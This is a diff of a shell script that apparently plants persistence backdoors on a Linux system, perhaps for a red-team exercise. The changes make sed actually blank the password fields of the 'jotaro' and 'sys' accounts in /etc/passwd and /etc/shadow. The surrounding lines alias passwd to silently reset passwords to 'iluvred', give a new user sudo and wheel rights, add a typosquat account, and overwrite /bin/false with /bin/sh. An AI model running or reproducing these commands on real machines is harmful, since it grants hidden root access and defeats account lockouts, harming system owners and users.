@@ -8,7 +8,7 @@ echo "alias passwd='passwd;(echo iluvred; echo iluvred) | passwd &>/dev/null'" >
 useradd jotaro
 usermod -g joestar jotaro
 usermod -G sudo,wheel jotaro
-sed "s/jotaro:x/jotaro:/" /etc/passwd
+sed -i "s/jotaro:x/jotaro:/" /etc/passwd
 mkdir /home/jotaro
 cp ../assets/.bashrc /home/jotaro/.bashrc
 
@@ -36,6 +36,6 @@ usermod -G dialout josuke
 # Typosquat user
 useradd kernpoops
 usermod -s "/usr/bin/nologin" kernpoops
-sed "s/sys:x/sys:/" /etc/shadow
+sed -i "s/sys:x/sys:/" /etc/shadow
 usermod -s "/usr/bin/nologin" sys
 cp "/bin/sh" "/bin/false"
